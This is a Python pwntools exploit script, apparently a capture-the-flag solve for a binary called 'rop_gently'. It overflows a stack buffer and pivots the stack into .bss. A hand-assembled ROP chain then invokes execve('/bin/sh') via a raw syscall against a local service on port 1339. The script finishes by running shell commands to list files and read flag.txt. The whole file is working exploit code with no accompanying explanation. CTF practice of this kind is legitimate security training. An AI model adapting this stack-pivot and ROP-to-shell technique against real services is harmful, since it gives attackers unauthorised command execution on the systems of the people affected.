from pwn import *
import time

context.binary = binary = ELF('./rop_gently', checksec=False)
context.log_level = 'info'

def solve():
    offset = 56
    new_stack = binary.bss() + 0x200
    
    rop = ROP(binary)
    rop.read(0, new_stack, 0x400)
    
    leave_ret = rop.find_gadget(['leave', 'ret'])
    pop_rbp = rop.find_gadget(['pop rbp', 'ret'])
    
    rop.raw(pop_rbp)
    rop.raw(new_stack)
    rop.raw(leave_ret)
    
    chain1 = rop.chain()
    payload1 = flat({offset: chain1})
    
    # Manual Chain 2
    rop2 = ROP(binary)
    pop_rdi = rop2.find_gadget(['pop rdi', 'ret'])
    pop_rsi = rop2.find_gadget(['pop rsi', 'ret'])
    pop_rax = rop2.find_gadget(['pop rax', 'ret'])
    syscall = rop2.find_gadget(['syscall'])
    
    # rdx?
    pop_rdx = None
    try:
        pop_rdx = rop2.find_gadget(['pop rdx', 'ret'])
    except:
        pass
        
    if not pop_rdx:
        try:
             pop_rdx = rop2.find_gadget(['pop rdx', 'pop rbx', 'ret'])
        except:
             pass

    if not (pop_rdi and pop_rsi and pop_rax and syscall and pop_rdx):
        log.error("Missing gadgets for manual execve!")
        rop2.call('execve', [new_stack + 200, 0, 0]) 
    else:
        log.info("Found all gadgets manually.")
        
    c = b""
    c += p64(pop_rdi.address)
    binsh_offset_in_chain = len(c)
    c += p64(0x41414141) 
    
    c += p64(pop_rsi.address)
    c += p64(0)
    
    c += p64(pop_rdx.address)
    if 'pop rbx' in str(pop_rdx):
        c += p64(0) 
        c += p64(0) 
    else:
        c += p64(0) 
    
    c += p64(pop_rax.address)
    c += p64(59)
    
    c += p64(syscall.address)
    
    binsh_data = b"/bin/sh\x00"
    
    full_len = len(c)
    real_binsh_addr = new_stack + 8 + full_len
    
    c = c[:binsh_offset_in_chain] + p64(real_binsh_addr) + c[binsh_offset_in_chain+8:]
    
    payload2 = p64(0xdeadbeef) + c + binsh_data
    
    io = remote('localhost', 1339)
            
    io.recvuntil(b"Can you ROP your way out of this?\n")
    io.send(payload1)
    
    time.sleep(1) # Increase wait
    
    io.send(payload2)
    time.sleep(0.5)
    
    log.info("Interactive...")
    # io.interactive()
    
    # Automated check
    io.sendline(b"ls -la")
    io.sendline(b"cat flag.txt")
    print(io.recvall(timeout=3))
    io.close()

if __name__ == "__main__":
    solve()
